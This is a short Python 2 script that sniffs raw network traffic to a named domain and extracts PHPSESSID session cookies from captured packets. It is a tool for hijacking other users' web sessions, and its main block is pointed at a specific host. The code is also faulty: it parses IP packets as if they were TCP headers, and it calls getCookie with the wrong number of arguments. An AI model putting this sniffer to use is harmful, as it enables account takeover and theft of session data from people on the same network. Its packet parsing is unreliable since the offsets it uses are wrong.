# -*- coding:utf-8 -*-

import socket
import struct

def unpack(packet):
    cflags = { # Control flags
        32:"U",
        16:"A",
        8:"P",
        4:"R",
        2:"S",
        1:"F"}
    _tcp = layer()
    _tcp.thl = (ord(packet[12])>>4) * 4
    _tcp.options = packet[20:_tcp.thl]
    _tcp.payload = packet[_tcp.thl:]
    tcph = struct.unpack("!HHLLBBHHH", packet[:20])
    _tcp.srcp = tcph[0] # source port
    _tcp.dstp = tcph[1] # destination port
    _tcp.seq = tcph[2] # sequence number
    _tcp.ack = hex(tcph[3]) # acknowledgment number
    _tcp.flags = ""
    for f in cflags:
        if tcph[5] & f:
            _tcp.flags+=cflags[f]
    _tcp.window = tcph[6] # window
    _tcp.checksum = hex(tcph[7]) # checksum
    _tcp.urg = tcph[8] # urgent pointer
    _tcp.list = [
        _tcp.srcp,
        _tcp.dstp,
        _tcp.seq,
        _tcp.ack,
        _tcp.thl,
        _tcp.flags,
        _tcp.window,
        _tcp.checksum,
        _tcp.urg,
        _tcp.options,
        _tcp.payload]
    return _tcp
    
class layer():
    pass


def getCookie(domain):
    dip = getDip(domain)
    sip = "192.168.1.104"
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    s.bind((sip, 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    while 1:
        buf = s.recvfrom(2048)
        packet = buf[0]  # data
        raw_iph = packet[0:20]  # 尚未解析的IP数据报头部固定部分
        iph = struct.unpack("!BBHHHBBH4s4s", raw_iph)
        if(dip==socket.inet_ntoa(iph[9])):
            tcp = unpack(packet)
            first = tcp.list[10].find("Cookie: PHPSESSID=")
            if(first>0):
                return tcp.list[10][first+18:first+44]
                break            
            
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)

def getDip(domain):
    return socket.gethostbyname(domain)
	
if __name__ == '__main__':
    print getCookie("10.10.13.200",getDip('zx.51cnb.xin'))
